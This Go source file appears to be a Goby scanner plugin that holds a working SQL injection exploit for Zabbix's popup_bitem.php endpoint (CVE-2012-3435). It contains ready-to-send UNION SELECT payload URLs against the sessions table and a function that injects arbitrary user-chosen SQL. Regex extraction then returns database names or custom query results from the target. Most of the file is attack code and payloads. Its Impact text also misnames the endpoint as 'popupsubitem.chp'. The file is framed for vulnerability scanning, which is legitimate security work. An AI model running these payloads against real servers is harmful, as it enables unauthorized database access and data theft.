package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zabbix /zabbix/popup_bitem SQL Injection Vulnerability(CVE-2012-3435)",
    "Description": "<p>Zabbix is an enterprise-grade distributed open-source monitoring solution. Zabbix software monitors numerous network parameters and the health and integrity of the server. Zabbix uses a flexible alerting mechanism that allows users to configure email-based alerting for almost any event. This allows users to respond quickly to server issues. Zabbix provides excellent reporting and data visualization based on stored data</p>",
    "Product": "ZABBIX-Monitoring",
    "Homepage": "https://www.zabbix.com/",
    "DisclosureDate": "2024-09-26",
    "PostTime": "2024-09-26",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"ZABBIX\" && body=\"zbxCallPostScripts\"",
    "GobyQuery": "title=\"ZABBIX\" && body=\"zbxCallPostScripts\"",
    "Level": "1",
    "Impact": "<p>There is an SQL injection vulnerability in its popupsubitem.chp function interface, which allows unauthorized attackers to access sensitive system information.</p>",
    "Recommendation": "<p>1. Follow the official patch release information, apply patches or upgrade to the latest version: <a href=\"https://www.zabbix.com\">https://www.zabbix.com</a></p><p>2. Deploy a web application firewall.</p><p>3. Unless necessary, public access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "model",
            "type": "select",
            "value": "database,Customize,sqlpoint",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "md5(123456)",
            "show": "model=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/zabbix/popup_bitem.php?itemid=1+union+select+1%2C1%2C1%2C1%2C1%2C1%2C%28SELECT+md5%28123456%29%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1+from+sessions+where+userid%3D%271%27%23&dstfrm=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/zabbix/popup_bitem.php?itemid=1+union+select+1%2C1%2C1%2C1%2C1%2C1%2Cmd5%28123456%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1+from+sessions+where+userid%3D%271%27%23&dstfrm=1",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2012-3435"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "Zabbix /zabbix/popup_bitem SQL 注入漏洞（CVE-2012-3435）",
            "Product": "ZABBIX-监控系统",
            "Description": "<p>Zabbix 是一个企业级分布式开源监控解决方案。Zabbix 软件能够监控众多网络参数和服务器的健康度、完整性。Zabbix 使用灵活的告警机制，允许用户为几乎任何事件配置基于邮件的告警。这样用户可以快速响应服务器问题。Zabbix 基于存储的数据提供出色的报表和数据可视化功能<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.zabbix.com\">https://www.zabbix.com</a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>其 popup_bitem.php 函数接口存在SQL注入漏洞，未经授权的攻击者访问，可能会获得系统敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "两高一弱",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zabbix /zabbix/popup_bitem SQL Injection Vulnerability(CVE-2012-3435)",
            "Product": "ZABBIX-Monitoring",
            "Description": "<p>Zabbix is an enterprise-grade distributed open-source monitoring solution. Zabbix software monitors numerous network parameters and the health and integrity of the server. Zabbix uses a flexible alerting mechanism that allows users to configure email-based alerting for almost any event. This allows users to respond quickly to server issues. Zabbix provides excellent reporting and data visualization based on stored data<br></p>",
            "Recommendation": "<p>1. Follow the official patch release information, apply patches or upgrade to the latest version: <a href=\"https://www.zabbix.com\">https://www.zabbix.com</a></p><p>2. Deploy a web application firewall.</p><p>3. Unless necessary, public access to the system is prohibited.</p>",
            "Impact": "<p>There is an SQL injection vulnerability in its popupsubitem.chp function interface, which allows unauthorized attackers to access sensitive system information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "2H1W",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9956"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		rawPayload := fmt.Sprintf("1 union select 1,1,1,1,1,1,(SELECT %s),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from sessions where userid='1'#", sql)
		urlget := "/zabbix/popup_bitem.php?itemid=" + url.QueryEscape(rawPayload) + "&dstfrm=1"
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/zabbix/popup_bitem.php?itemid="

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "e10adc3949ba59abbe56e057f20f883e"

			sql := "md5(123456)"

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqlpoint := "GET /zabbix/popup_bitem.php?itemid=1+union+select+1%2C1%2C1%2C1%2C1%2C1%2Cversion%28%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1+from+sessions+where+userid%3D%271%27%23&dstfrm=1\n HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.9\n" +
				"Upgrade-Insecure-Requests: 1\n\n"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `name="caption"[^>]*value="([^"]+)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["model"])
			if attacktype == "Customize" {
				sql := goutils.B2S(ss.Params["Customize"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "获取到相关信息\n" + output
			} else if attacktype == "database" {
				sql := "database()"
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "数据库名称\n" + output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
